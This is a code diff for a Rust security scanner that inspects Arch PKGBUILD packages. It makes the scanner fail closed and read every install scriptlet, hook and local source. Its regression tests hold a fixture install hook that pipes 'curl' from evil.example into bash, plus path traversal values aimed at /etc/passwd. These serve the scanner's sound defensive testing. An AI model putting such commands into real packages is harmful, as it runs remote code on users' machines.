@@ -17,6 +17,7 @@ pub mod history;
 pub mod neturl;
 pub mod overlay;
 pub mod parser;
+pub mod pkgfiles;
 pub mod provenance;
 pub mod registry;
 pub mod resolve;
@@ -29,6 +30,7 @@ pub mod types;
 pub mod validate;
 
 pub use error::{ParseError, Result, ScanError};
+pub use pkgfiles::read_text_capped;
 pub use types::*;
 
 use analyzer::SecurityAnalyzer;
@@ -56,13 +58,17 @@ impl Scanner {
         // matching engine, not just the catalog listing).
         let mut engine = RuleEngine::default();
         if let Some(rules_path) = config.rules_path.as_ref() {
-            if let Err(e) = engine.load_rules_from_dir(rules_path) {
-                warn!(
+            // An explicitly configured rules directory that cannot be loaded is
+            // a hard error, like a malformed config: warning and continuing
+            // ran the scan WITHOUT the operator's custom rules while they
+            // believed those rules were in force.
+            engine.load_rules_from_dir(rules_path).map_err(|e| {
+                ScanError::Config(format!(
                     "failed to load custom rules from {}: {}",
                     rules_path.display(),
                     e
-                );
-            }
+                ))
+            })?;
         }
         let rule_engine = Arc::new(engine);
         let ioc_db = Arc::new(IocDatabase::load());
@@ -107,13 +113,10 @@ impl Scanner {
         })
     }
 
-    /// The minimum severity this scanner reports.
+    /// The minimum severity the operator wants DISPLAYED.
     ///
-    /// Exposed so that findings produced *after* a scan returns -- change
-    /// detection compares against stored history, which the scan itself cannot
-    /// do -- can be filtered by the same threshold. Otherwise `DIFF-*` would
-    /// appear at severities the operator had explicitly filtered out, while
-    /// every other code obeyed the setting.
+    /// Display only: `scan_pkgbuild` returns every finding and gates evaluate
+    /// all of them. Apply it with [`ScanResult::visible`] at output time.
     pub fn min_severity(&self) -> Severity {
         self.config.min_severity
     }
@@ -189,42 +192,22 @@ impl Scanner {
             pkgbuild.pkgrel
         );
 
-        // Parse install script if present. The install= filename is frequently
-        // written with variables (install="$pkgname.install"), and the install
-        // hook is exactly where install-time payloads (CHAOS RAT, Atomic Arch)
-        // live -- so resolution must expand variables and fall back to globbing.
-        let dir = path.parent().unwrap_or(Path::new("."));
-        let install_path = resolve_install_path(dir, &pkgbuild);
-        let install_script = if let Some(install_path) = install_path {
-            match read_text_capped(&install_path) {
-                Ok(script_content) => Some(parser::ParsedInstallScript {
-                    content: script_content.clone(),
-                    path: install_path,
-                    hooks: parser::parse_install_hooks(&script_content),
-                }),
-                Err(e) => {
-                    warn!(
-                        "Failed to read install script {}: {}",
-                        install_path.display(),
-                        e
-                    );
-                    None
-                }
-            }
-        } else {
-            None
+        // Everything makepkg runs or installs from beside the PKGBUILD: every
+        // install= scriptlet (global and per split package), ALPM hooks, local
+        // source=() entries (patches, sidecar scripts, resolved the way makepkg
+        // names them) and script-like files nobody declared. Read lossily and
+        // capped, never following symlinks; anything that cannot be fully
+        // analyzed comes back as a Critical SCAN-001 finding rather than being
+        // dropped (a non-UTF-8 byte or padding past the cap used to make a
+        // `curl | bash` scriptlet scan clean).
+        let dir = match path.parent() {
+            Some(p) if !p.as_os_str().is_empty() => p,
+            _ => Path::new("."),
         };
-        // ALPM .hook files ship next to the PKGBUILD in some attack waves and
-        // are installed into /usr/share/libalpm/hooks/ — scan them as side
-        // scriptlets. Never execute; text only.
-        let mut side_scripts = discover_alpm_hooks(dir);
-        // Files the PKGBUILD pulls in from the package directory itself --
-        // patches, sidecar shell scripts, .service units. These were previously
-        // never read at all, so a payload in `0001-fix.patch`, or a
-        // `. ./helper.sh` that moves every interesting line out of the file
-        // under review, was completely invisible. They go through the same rule
-        // surface as an install scriptlet; never executed.
-        side_scripts.extend(discover_local_sources(dir, &pkgbuild));
+        let pkg_files = pkgfiles::collect(dir, &pkgbuild);
+        let unanalyzed = pkg_files.findings;
+        let install_script = pkg_files.install;
+        let side_scripts = pkg_files.side;
         // Prebuilt executables committed into the package directory. Read as
         // bytes, parsed as structure, never executed.
         let local_binaries = discover_local_binaries(dir);
@@ -250,7 +233,7 @@ impl Scanner {
         };
 
         // Run all analyzers
-        let mut findings = Vec::new();
+        let mut findings = unanalyzed;
         for analyzer in &self.analyzers {
             match analyzer.analyze(&context).await {
                 Ok(analyzer_findings) => {
@@ -262,13 +245,19 @@ impl Scanner {
                     findings.extend(analyzer_findings);
                 }
                 Err(e) => {
-                    warn!("Analyzer {} failed: {}", analyzer.name(), e);
+                    // Fail closed. Dropping an erroring analyzer's findings and
+                    // carrying on reported a partial scan as a clean one.
+                    return Err(ScanError::Rule(format!(
+                        "analyzer {} failed: {e}; refusing to report an incomplete scan",
+                        analyzer.name()
+                    )));
                 }
             }
         }
 
-        // Filter by minimum severity (lower enum value = higher severity)
-        findings.retain(|f| f.severity <= self.config.min_severity);
+        // NOTE: no severity filtering here. `min_severity` is a DISPLAY
+        // setting (see `ScanResult::visible`); every gate must see every
+        // finding, or a user-writable config could switch High gates off.
 
         // Sort by severity (critical first)
         findings.sort_by_key(|f| f.severity);
@@ -394,170 +383,6 @@ fn build_threat_intel_analyzer(config: &ScanConfig) -> Option<analyzer::ThreatIn
     analyzer::ThreatIntelAnalyzer::new(vt_key, urlhaus_key, cache, ttl)
 }
 
-/// Maximum size of a file the scanner will read into memory. Real PKGBUILDs
-/// and install scripts are a few KB; anything past this is abnormal and a
-/// memory-exhaustion risk from a hostile repository.
-const MAX_SCAN_FILE_BYTES: u64 = 2 * 1024 * 1024;
-
-/// Read a text file, refusing files larger than [`MAX_SCAN_FILE_BYTES`].
-///
-/// Public so every caller that touches package-controlled files -- including the
-/// CLI's history and diff paths -- shares one cap rather than each reaching for
-/// `std::fs::read_to_string`.
-pub fn read_text_capped(path: &Path) -> Result<String> {
-    let len = std::fs::metadata(path)?.len();
-    if len > MAX_SCAN_FILE_BYTES {
-        warn!(
-            "refusing to read {} ({} bytes > {} cap): possible resource-exhaustion attempt",
-            path.display(),
-            len,
-            MAX_SCAN_FILE_BYTES
-        );
-        return Err(ScanError::Io(std::io::Error::other(format!(
-            "file too large to scan safely: {len} bytes"
-        ))));
-    }
-    Ok(std::fs::read_to_string(path)?)
-}
-
-/// Resolve the path to a package's install script.
-///
-/// PKGBUILDs commonly reference the install file via variables
-/// (`install="$pkgname.install"`), and some omit `install=` while still
-/// shipping a `*.install` hook. Both cases must be resolved, because the
-/// install hook is a primary malware delivery vector. Resolution order:
-/// 1. Expand `$pkgname`/`$pkgbase` in the declared `install=` value.
-/// 2. Fall back to a single `*.install` file in the package directory.
-fn resolve_install_path(
-    dir: &Path,
-    pkgbuild: &parser::ParsedPkgbuild,
-) -> Option<std::path::PathBuf> {
-    let pkgname = pkgbuild.pkgname.first().cloned().unwrap_or_default();
-
-    if let Some(install_file) = &pkgbuild.install {
-        let expanded = expand_pkg_vars(install_file, &pkgname);
-        // An install scriptlet is always a bare filename inside the package
-        // directory. Reject path separators / traversal so a hostile install=
-        // value cannot make us read a file outside the cloned package dir.
-        if expanded.is_empty() || expanded.contains('/') || expanded.contains("..") {
-            warn!(
-                "ignoring suspicious install= value '{}' (path traversal)",
-                install_file
-            );
-        } else {
-            let candidate = dir.join(&expanded);
-            if candidate.is_file() {
-                return Some(candidate);
-            }
-            warn!(
-                "install= references '{}' (resolved '{}') but the file is missing; \
-                 falling back to *.install discovery",
-                install_file, expanded
-            );
-        }
-    }
-
-    // Fallback: a lone *.install file in the package directory.
-    let mut install_files: Vec<std::path::PathBuf> = std::fs::read_dir(dir)
-        .ok()?
-        .flatten()
-        .map(|e| e.path())
-        .filter(|p| p.extension().and_then(|e| e.to_str()) == Some("install"))
-        .collect();
-    install_files.sort();
-    match install_files.len() {
-        0 => None,
-        1 => Some(install_files.remove(0)),
-        _ => {
-            // Prefer the one matching the package name; otherwise scan the first
-            // and warn so the gap is visible rather than silent.
-            let preferred = install_files
-                .iter()
-                .find(|p| p.file_stem().and_then(|s| s.to_str()) == Some(pkgname.as_str()))
-                .cloned();
-            if preferred.is_none() {
-                warn!(
-                    "multiple *.install files in {}; scanning '{}'",
-                    dir.display(),
-                    install_files[0].display()
-                );
-            }
-            preferred.or_else(|| Some(install_files.remove(0)))
-        }
-    }
-}
-
-/// Read the local (non-remote) entries of `source=()` so their contents are
-/// analyzed rather than merely counted.
-///
-/// A `source=()` entry with no scheme is a file shipped in the package
-/// directory. Two well-known techniques live there and were previously
-/// invisible: a build fix `.patch` that quietly adds a command to a Makefile,
-/// and a sidecar script the PKGBUILD `source`s so that the file a reviewer reads
-/// contains almost nothing.
-///
-/// Everything here is read as text and capped; binary blobs are skipped rather
-/// than force-decoded. Path handling refuses anything that is not a plain
-/// relative name inside the package directory, so a hostile
-/// `source=('../../etc/shadow')` cannot make the scanner read outside the tree.
-fn discover_local_sources(
-    dir: &Path,
-    pkgbuild: &parser::ParsedPkgbuild,
-) -> Vec<parser::ParsedInstallScript> {
-    let mut out = Vec::new();
-    let mut seen: Vec<PathBuf> = Vec::new();
-
-    for entry in &pkgbuild.source {
-        if entry.protocol.is_remote() {
-            continue;
-        }
-        // makepkg fetches a renamed source as the rename; otherwise the entry
-        // itself is the filename.
-        let name = entry.filename.clone().unwrap_or_else(|| entry.url.clone());
-        let name = name.trim();
-
-        // Plain relative filename only. No separators, no traversal, no
-        // absolute paths, no shell metacharacters left unexpanded.
-        if name.is_empty()
-            || name.contains('/')
-            || name.contains('\\')
-            || name.contains("..")
-            || name.starts_with('.')
-            || name.contains('$')
-        {
-            if !name.is_empty() {
-                debug!("not reading local source {name:?}: not a plain in-directory filename");
-            }
-            continue;
-        }
-
-        let path = dir.join(name);
-        if !path.is_file() || seen.contains(&path) {
-            continue;
-        }
-        seen.push(path.clone());
-
-        match read_text_capped(&path) {
-            Ok(content) => {
-                // Skip anything that is not text: a NUL byte means a binary
-                // blob, and running text rules over decoded binary produces
-                // noise, not findings.
-                if content.contains('\0') {
-                    debug!("skipping binary local source {}", path.display());
-                    continue;
-                }
-                out.push(parser::ParsedInstallScript {
-                    hooks: parser::parse_install_hooks(&content),
-                    content,
-                    path,
-                });
-            }
-            Err(e) => debug!("could not read local source {}: {e}", path.display()),
-        }
-    }
-    out
-}
-
 /// How much of a binary to read. The ELF header, section header table and
 /// string tables all live near the front, so a bounded prefix answers every
 /// question this scanner asks -- and a package may ship a legitimately huge
@@ -621,60 +446,6 @@ fn discover_local_binaries(dir: &Path) -> Vec<BinaryArtifact> {
     out
 }
 
-/// Discover ALPM hook files (`*.hook`) beside the PKGBUILD.
-///
-/// Atomic Arch wave 4 delivered payload via `.hook` files installed into
-/// `/usr/share/libalpm/hooks/`. These are not referenced by `install=`, so a
-/// scanner that only reads the install scriptlet misses them. Each discovered
-/// file is read as text (capped) and returned for static analysis — never
-/// executed. Path components are the directory listing only (no attacker-
-/// controlled name expansion).
-fn discover_alpm_hooks(dir: &Path) -> Vec<parser::ParsedInstallScript> {
-    let mut hooks: Vec<parser::ParsedInstallScript> = Vec::new();
-    let Ok(entries) = std::fs::read_dir(dir) else {
-        return hooks;
-    };
-    let mut paths: Vec<PathBuf> = entries
-        .flatten()
-        .map(|e| e.path())
-        .filter(|p| {
-            p.is_file()
-                && p.extension().and_then(|e| e.to_str()) == Some("hook")
-                // Refuse odd names that look like traversal even though
-                // read_dir only yields direct children.
-                && p.file_name()
-                    .and_then(|n| n.to_str())
-                    .is_some_and(|n| !n.is_empty() && !n.starts_with('.') && !n.contains(".."))
-        })
-        .collect();
-    paths.sort();
-    for path in paths {
-        match read_text_capped(&path) {
-            Ok(content) => hooks.push(parser::ParsedInstallScript {
-                content: content.clone(),
-                path,
-                hooks: parser::parse_install_hooks(&content),
-            }),
-            Err(e) => {
-                warn!("Failed to read ALPM hook {}: {}", path.display(), e);
-            }
-        }
-    }
-    hooks
-}
-
-/// Expand the small set of PKGBUILD variables that legitimately appear in an
-/// `install=` value: `$pkgname`/`${pkgname}` and `$pkgbase`/`${pkgbase}`.
-fn expand_pkg_vars(value: &str, pkgname: &str) -> String {
-    value
-        .replace("${pkgname}", pkgname)
-        .replace("$pkgname", pkgname)
-        .replace("${pkgbase}", pkgname)
-        .replace("$pkgbase", pkgname)
-        .trim_matches(['"', '\''])
-        .to_string()
-}
-
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -694,30 +465,336 @@ mod tests {
         assert_eq!(a.is_ok(), b.is_ok());
     }
 
-    #[test]
-    fn test_install_path_rejects_traversal() {
-        // A hostile install= value must not let resolution read outside the dir.
-        let pkg = parser::ParsedPkgbuild {
-            pkgname: vec!["x".into()],
-            install: Some("../../../../etc/passwd".into()),
-            ..Default::default()
-        };
-        let resolved = resolve_install_path(Path::new("/tmp/some-pkg-dir"), &pkg);
-        assert!(resolved.is_none(), "traversal value must be rejected");
+    // ---- fail-open regressions (audit 2026-10) -------------------------------
+
+    const EVIL: &str = "post_install() { curl -s https://evil.example/x.sh | bash; }\n";
+
+    fn write_pkg(dir: &Path, pkgbuild_extra: &str) {
+        std::fs::write(
+            dir.join("PKGBUILD"),
+            format!(
+                "pkgname=demo\npkgver=1\npkgrel=1\narch=('any')\n{pkgbuild_extra}\npackage() {{ :; }}\n"
+            ),
+        )
+        .unwrap();
+    }
+
+    fn parse_dir(dir: &Path) -> parser::ParsedPkgbuild {
+        parser::PkgbuildParser::parse(
+            &parser::StaticParser::new(),
+            &std::fs::read_to_string(dir.join("PKGBUILD")).unwrap(),
+        )
+        .unwrap()
+    }
+
+    async fn scan(dir: &Path) -> ScanResult {
+        Scanner::with_defaults()
+            .unwrap()
+            .scan_directory(dir, Registry::None)
+            .await
+            .unwrap()
+    }
+
+    fn has_critical(r: &ScanResult) -> bool {
+        r.findings.iter().any(|f| f.severity == Severity::Critical)
+    }
+
+    fn scanned_names(r: &ScanResult) -> Vec<String> {
+        r.scanned_files
+            .iter()
+            .filter_map(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()))
+            .collect()
+    }
+
+    #[tokio::test]
+    async fn install_script_baseline_is_critical() {
+        let d = tempfile::tempdir().unwrap();
+        write_pkg(d.path(), "install=demo.install");
+        std::fs::write(d.path().join("demo.install"), EVIL).unwrap();
+        assert!(has_critical(&scan(d.path()).await));
+    }
+
+    #[tokio::test]
+    async fn non_utf8_byte_does_not_hide_install_script() {
+        let d = tempfile::tempdir().unwrap();
+        write_pkg(d.path(), "install=demo.install");
+        let mut bytes = b"# \xff\n".to_vec();
+        bytes.extend_from_slice(EVIL.as_bytes());
+        std::fs::write(d.path().join("demo.install"), bytes).unwrap();
+        let r = scan(d.path()).await;
+        assert!(
+            has_critical(&r),
+            "got {:?}",
+            r.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
+        );
+    }
+
+    #[tokio::test]
+    async fn non_utf8_byte_does_not_hide_hook_file() {
+        let d = tempfile::tempdir().unwrap();
+        write_pkg(d.path(), "");
+        let mut bytes = b"# \xff\n".to_vec();
+        bytes.extend_from_slice(EVIL.as_bytes());
+        std::fs::write(d.path().join("x.hook"), bytes).unwrap();
+        assert!(has_critical(&scan(d.path()).await));
+    }
+
+    #[tokio::test]
+    async fn non_utf8_byte_does_not_hide_local_source() {
+        let d = tempfile::tempdir().unwrap();
+        write_pkg(d.path(), "source=('helper.sh')");
+        let mut bytes = b"#!/bin/sh\n# \xff\n".to_vec();
+        bytes.extend_from_slice(b"curl -s https://evil.example/x.sh | bash\n");
+        std::fs::write(d.path().join("helper.sh"), bytes).unwrap();
+        let r = scan(d.path()).await;
+        assert!(scanned_names(&r).contains(&"helper.sh".to_string()));
+        assert!(has_critical(&r));
+    }
+
+    #[tokio::test]
+    async fn oversized_install_script_is_unanalyzable_critical() {
+        let d = tempfile::tempdir().unwrap();
+        write_pkg(d.path(), "install=demo.install");
+        let mut body = EVIL.as_bytes().to_vec();
+        body.resize(pkgfiles::MAX_SCAN_FILE_BYTES as usize + 10, b'#');
+        std::fs::write(d.path().join("demo.install"), body).unwrap();
+        let r = scan(d.path()).await;
+        assert!(
+            r.has_unanalyzable(),
+            "padding past the cap must be SCAN-001"
+        );
+        // The capped prefix is still scanned, so the payload is also reported.
+        assert!(r.findings.iter().any(|f| f.id != UNANALYZABLE_CODE));
+    }
+
+    #[tokio::test]
+    async fn oversized_local_source_and_hook_are_unanalyzable() {
+        let d = tempfile::tempdir().unwrap();
+        write_pkg(d.path(), "source=('helper.sh')");
+        let big = vec![b'#'; pkgfiles::MAX_SCAN_FILE_BYTES as usize + 1];
+        std::fs::write(d.path().join("helper.sh"), &big).unwrap();
+        std::fs::write(d.path().join("a.hook"), &big).unwrap();
+        let r = scan(d.path()).await;
+        let n = r
+            .findings
+            .iter()
+            .filter(|f| f.id == UNANALYZABLE_CODE)
+            .count();
+        assert_eq!(n, 2, "one SCAN-001 per oversized file");
+    }
+
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn symlinked_declared_install_is_unanalyzable_and_never_read() {
+        let d = tempfile::tempdir().unwrap();
+        write_pkg(d.path(), "install=demo.install");
+        let target = d.path().join("elsewhere.txt");
+        std::fs::write(&target, "TOPSECRET-CONTENT\n").unwrap();
+        // Point at a file outside the package dir.
+        let outside = tempfile::tempdir().unwrap();
+        let secret = outside.path().join("hostname");
+        std::fs::write(&secret, "TOPSECRET-CONTENT\n").unwrap();
+        std::os::unix::fs::symlink(&secret, d.path().join("demo.install")).unwrap();
+        let r = scan(d.path()).await;
+        let f = r
+            .findings
+            .iter()
+            .find(|f| f.id == UNANALYZABLE_CODE)
+            .expect("symlink must be SCAN-001");
+        assert!(
+            f.description.contains(secret.to_str().unwrap()),
+            "target is named"
+        );
+        let json = serde_json::to_string(&r).unwrap();
+        assert!(
+            !json.contains("TOPSECRET-CONTENT"),
+            "link contents must not leak into findings"
+        );
+    }
+
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn symlink_to_dev_zero_and_fifo_do_not_hang_or_pass_clean() {
+        let d = tempfile::tempdir().unwrap();
+        write_pkg(d.path(), "");
+        std::os::unix::fs::symlink("/dev/zero", d.path().join("zero.install")).unwrap();
+        let fifo = d.path().join("x.install");
+        let made = std::process::Command::new("mkfifo")
+            .arg(&fifo)
+            .status()
+            .map(|s| s.success())
+            .unwrap_or(false);
+        let r = tokio::time::timeout(std::time::Duration::from_secs(20), scan(d.path()))
+            .await
+            .expect("scan must not hang on a FIFO");
+        let n = r
+            .findings
+            .iter()
+            .filter(|f| f.id == UNANALYZABLE_CODE)
+            .count();
+        assert_eq!(n, if made { 2 } else { 1 });
+    }
+
+    #[tokio::test]
+    async fn split_package_install_in_function_is_scanned() {
+        let d = tempfile::tempdir().unwrap();
+        std::fs::write(
+            d.path().join("PKGBUILD"),
+            "pkgbase=demo\npkgname=(demo demo-extra)\npkgver=1\npkgrel=1\narch=('any')\ninstall=demo.install\n\
+             package_demo() { :; }\npackage_demo-extra() {\n  install=extra.install\n}\n",
+        )
+        .unwrap();
+        std::fs::write(d.path().join("demo.install"), EVIL).unwrap();
+        std::fs::write(
+            d.path().join("extra.install"),
+            "post_install() { echo hi; }\n",
+        )
+        .unwrap();
+        let pkg = parse_dir(d.path());
+        assert!(pkg.installs.contains(&"demo.install".to_string()));
+        assert!(pkg.installs.contains(&"extra.install".to_string()));
+        let r = scan(d.path()).await;
+        assert!(
+            has_critical(&r),
+            "main package's install must still be scanned"
+        );
+        let names = scanned_names(&r);
+        assert!(
+            names.contains(&"demo.install".to_string())
+                && names.contains(&"extra.install".to_string()),
+            "{names:?}"
+        );
+    }
+
+    #[tokio::test]
+    async fn variable_and_subdir_local_sources_are_read() {
+        let d = tempfile::tempdir().unwrap();
+        write_pkg(
+            d.path(),
+            "_h=helper\nsource=(\"${pkgname}-helper.sh\" \"scripts/other.sh\" \"${_h}2.sh\")",
+        );
+        std::fs::write(d.path().join("demo-helper.sh"), EVIL).unwrap();
+        std::fs::write(d.path().join("other.sh"), "echo other\n").unwrap();
+        std::fs::write(d.path().join("helper2.sh"), "echo two\n").unwrap();
+        let r = scan(d.path()).await;
+        let names = scanned_names(&r);
+        for want in ["demo-helper.sh", "other.sh", "helper2.sh"] {
+            assert!(names.contains(&want.to_string()), "{want}: {names:?}");
+        }
+        assert!(has_critical(&r));
     }
 
     #[test]
-    fn test_expand_pkg_vars() {
-        assert_eq!(
-            expand_pkg_vars("${pkgname}.install", "alvr"),
-            "alvr.install"
+    fn rename_and_unresolved_source_names_are_resolved() {
+        let d = tempfile::tempdir().unwrap();
+        write_pkg(
+            d.path(),
+            "source=(\"fix.sh::local-fix.sh\" \"v${pkgver//./_}.patch\")",
         );
-        assert_eq!(expand_pkg_vars("$pkgname.install", "alvr"), "alvr.install");
-        assert_eq!(
-            expand_pkg_vars("\"$pkgbase.install\"", "alvr"),
-            "alvr.install"
+        std::fs::write(d.path().join("fix.sh"), "echo fix\n").unwrap();
+        std::fs::write(d.path().join("v1.patch"), "+echo patch\n").unwrap();
+        let files = pkgfiles::collect(d.path(), &parse_dir(d.path()));
+        let names: Vec<_> = files
+            .side
+            .iter()
+            .filter_map(|s| s.path.file_name().map(|n| n.to_string_lossy().into_owned()))
+            .collect();
+        assert!(names.contains(&"fix.sh".to_string()), "{names:?}");
+        assert!(names.contains(&"v1.patch".to_string()), "{names:?}");
+    }
+
+    #[test]
+    fn undeclared_script_files_are_scanned_and_labelled_as_source() {
+        let d = tempfile::tempdir().unwrap();
+        write_pkg(d.path(), "");
+        std::fs::write(d.path().join("run"), "#!/bin/sh\necho hi\n").unwrap();
+        std::fs::write(d.path().join("notes.txt"), "plain\n").unwrap();
+        let files = pkgfiles::collect(d.path(), &parse_dir(d.path()));
+        assert_eq!(files.side.len(), 1);
+        assert_eq!(files.side[0].file_type, FileType::SourceFile);
+    }
+
+    #[test]
+    fn local_source_path_traversal_is_not_read() {
+        let d = tempfile::tempdir().unwrap();
+        let outside = tempfile::tempdir().unwrap();
+        std::fs::write(outside.path().join("secret.sh"), "SECRET\n").unwrap();
+        write_pkg(
+            d.path(),
+            &format!(
+                "source=('{}/secret.sh' '../secret.sh')",
+                outside.path().display()
+            ),
         );
-        assert_eq!(expand_pkg_vars("custom.install", "alvr"), "custom.install");
+        let files = pkgfiles::collect(d.path(), &parse_dir(d.path()));
+        assert!(files.side.iter().all(|s| !s.content.contains("SECRET")));
+    }
+
+    #[test]
+    fn install_traversal_is_unanalyzable_not_silent() {
+        let d = tempfile::tempdir().unwrap();
+        write_pkg(d.path(), "install=../../../../etc/passwd");
+        let files = pkgfiles::collect(d.path(), &parse_dir(d.path()));
+        assert!(files.install.is_none());
+        assert!(files.findings.iter().any(|f| f.id == UNANALYZABLE_CODE));
+    }
+
+    #[tokio::test]
+    async fn min_severity_does_not_hide_findings_from_gates() {
+        let d = tempfile::tempdir().unwrap();
+        write_pkg(
+            d.path(),
+            "install=demo.install\nsource=('https://example.com/a.tar.gz')",
+        );
+        std::fs::write(d.path().join("demo.install"), EVIL).unwrap();
+        let cfg = ScanConfig {
+            min_severity: Severity::Critical,
+            ..Default::default()
+        };
+        let r = Scanner::new(cfg)
+            .unwrap()
+            .scan_directory(d.path(), Registry::None)
+            .await
+            .unwrap();
+        // Everything is kept; only `visible` narrows what is shown.
+        assert!(r.findings.iter().any(|f| f.severity != Severity::Critical));
+        assert!(r
+            .visible(Severity::Critical)
+            .findings
+            .iter()
+            .all(|f| f.severity == Severity::Critical));
+    }
+
+    #[test]
+    fn explicit_rules_path_failure_is_a_hard_error() {
+        let cfg = ScanConfig {
+            rules_path: Some(PathBuf::from("/nonexistent/aur-scan-rules-dir")),
+            ..Default::default()
+        };
+        assert!(matches!(Scanner::new(cfg), Err(ScanError::Config(_))));
+    }
+
+    #[tokio::test]
+    async fn analyzer_error_fails_closed() {
+        struct Boom;
+        #[async_trait::async_trait]
+        impl SecurityAnalyzer for Boom {
+            fn name(&self) -> &str {
+                "boom"
+            }
+            async fn analyze(&self, _: &AnalysisContext) -> Result<Vec<Finding>> {
+                Err(ScanError::Network("down".into()))
+            }
+        }
+        let d = tempfile::tempdir().unwrap();
+        write_pkg(d.path(), "");
+        let mut scanner = Scanner::with_defaults().unwrap();
+        scanner.analyzers.push(Arc::new(Boom));
+        let r = scanner.scan_directory(d.path(), Registry::None).await;
+        assert!(
+            r.is_err(),
+            "an analyzer error must not yield a clean result"
+        );
     }
 
     #[tokio::test]
